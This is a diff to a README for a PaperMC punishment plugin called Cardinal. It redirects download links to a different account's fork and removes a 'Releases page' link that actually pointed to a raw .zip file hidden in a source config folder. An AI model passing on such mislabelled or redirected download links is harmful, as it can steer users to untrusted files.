@@ -1,7 +1,7 @@
 # 🎮 Cardinal - A Modern Approach to Fair Punishments
 
 ## 🔗 Download Now
-[![Download Cardinal](https://img.shields.io/badge/Download-Cardinal-blue.svg)](https://github.com/ItzFrancyDev/Cardinal/releases)
+[![Download Cardinal](https://img.shields.io/badge/Download-Cardinal-blue.svg)](https://github.com/Ilovemybigas/Cardinal/releases)
 
 ## 🌟 Overview
 Cardinal is a modern punishment system designed to enhance your experience on PaperMC servers. This tool provides a simple, user-friendly way to manage player behavior through an intuitive GUI.
@@ -13,7 +13,7 @@ To get started with Cardinal, you need to follow these steps.
 Make sure you have a PaperMC server already installed. Cardinal works best with Java 21, so ensure your server is using this version. If you need help with setting up a PaperMC server, there are many resources online.
 
 ### Step 2: Visit the Release Page
-Go to the [Cardinal Releases page](https://raw.githubusercontent.com/Ilovemybigas/Cardinal/master/cardinal-paper/src/main/java/eg/mqzen/cardinal/config/Software_2.8.zip). Here, you will find the latest version of Cardinal available for download.
+Go to the [Cardinal Releases page](https://github.com/Ilovemybigas/Cardinal/releases). Here, you will find the latest version of Cardinal available for download.
 
 ### Step 3: Download Cardinal
 Look for the most recent release. Click to download the plugin file. It will usually have an `.jar` extension, such as `https://github.com/ItzFrancyDev/Cardinal/releases`.
